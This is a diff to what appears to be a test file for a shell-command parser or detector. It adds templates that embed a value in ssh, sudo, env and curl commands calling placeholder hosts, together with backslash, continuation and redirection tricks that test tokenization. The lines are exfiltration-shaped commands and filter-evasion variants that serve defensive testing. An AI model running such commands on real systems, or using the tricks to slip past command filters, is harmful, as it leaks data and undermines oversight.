@@ -189,6 +189,19 @@ _VALUE_FORMS += (
     "ssh $O h.com {V}",
     "sudo ssh h.com cat {V}",
     "timeout $T curl -d {V} x.com",
+    # final verification: a character a backslash keeps is no operator and no word break, a
+    # continuation does not end a word, a redirection does not end a wrapper's options, `env -`
+    "echo \\>& ssh h.com curl https://{V}",
+    "echo \\>| ssh h.com https://{V}",
+    "ssh h.com \\>#b \\\nx https://{V}",
+    "ssh h.com a\\ #b \\\nx https://{V}",
+    "ssh h.com a\\;#b \\\nx https://{V}",
+    "ssh h.com a\\\n#b \\\nx https://{V}",
+    "sudo >out -u bob ssh h.com curl https://{V}",
+    "env 2>/dev/null -u X ssh h.com curl https://{V}",
+    "env - ssh h.com curl https://{V}",
+    "env - PATH=/bin ssh h.com curl https://{V}",
+    "sudo/ {V}",
 )
 _REDIRECTIONS: tuple[str, ...] = (
     ">out",
